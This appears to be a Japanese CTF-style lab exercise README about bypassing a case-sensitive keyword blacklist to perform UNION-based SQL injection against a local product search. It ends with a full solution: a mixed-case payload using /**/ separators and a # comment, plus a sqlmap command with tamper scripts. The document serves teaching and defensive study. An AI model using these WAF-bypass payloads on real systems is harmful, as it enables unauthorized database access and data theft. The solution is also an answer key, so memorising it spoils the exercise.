# 04 - Filter Bypass (WAF-style Blacklist)

`http://localhost:3004` の商品検索から、DB内のflagを抜き出せ。
`server.py`のソースコードは読んでよい。

このDBのテーブル構成:
- `products(id, name, description, price)` — 検索対象、4カラム
- `flags(id, flag)` — 無関係の別テーブル。目標はこの`flag`を検索結果に混ぜ込むこと

`/search`には禁止語チェックがあり、`UNION`や`SELECT`を含むリクエストは
`{"error": "forbidden pattern detected"}`で弾かれる。02と同じ脆弱なクエリ組み立てだが、
素直なpayloadはそのままでは通らない。

## ヒント

<details><summary>ヒント1</summary>

`server.py`の`BLOCKED`リストを見ろ。何が禁止語として登録されている? 判定方法(`in`演算子)
は大文字小文字を区別するか?

</details>

<details><summary>ヒント2</summary>

`UNION`/`SELECT`は完全一致文字列チェックでしか弾かれていない。MySQLのキーワードは
大文字小文字を区別しないので、大文字小文字を混ぜれば(`UnIoN`, `SeLeCt`など)チェックを
すり抜けたままSQLとしては正しく解釈される。

</details>

<details><summary>ヒント3</summary>

スペース(半角空白)も1文字まるごと禁止語に入っている。MySQLでは`/**/`(空コメント)が
トークンの区切りとして空白の代わりに使える。末尾のコメントも`--`は禁止語なので、
代わりに`#`(MySQLのもう1つの行コメント記法)を使え。

</details>

<details><summary>解答</summary>

送るpayload(`q`パラメータ、URLエンコード前):
```
zzz'/**/uNioN/**/sElEcT/**/id,flag,NULL,NULL/**/fRoM/**/flags#
```

サーバー側で組み立てられる実際のSQLはこうなる:
```sql
SELECT id, name, description, price FROM products
WHERE name LIKE '%zzz'/**/uNioN/**/sElEcT/**/id,flag,NULL,NULL/**/fRoM/**/flags#%'
```

分解すると:
- `UNION`/`SELECT`/`FROM`を大文字小文字混在にして禁止語の完全一致チェックをすり抜ける
  (MySQL自体はキーワードの大文字小文字を区別しないのでSQLとしては正しく動く)
- 半角スペースの代わりに`/**/`(中身が空のブロックコメント)をトークン区切りに使う。
  これも禁止語チェックには引っかからない
- `--`が禁止語のため、末尾のコメントには`#`を使う。これで残る`%'`を無効化する

02と同じUNIONベースの抽出だが、禁止語チェックが「特定の書き方」しか弾いていない
(大文字小文字・空白・コメント記法のバリエーションを網羅していない)ことを見抜くのが
この問題の核心。

sqlmapを使う場合:
```
sqlmap -u "http://localhost:3004/search?q=zzz" -p q --tamper=space2comment,randomcase
```

</details>
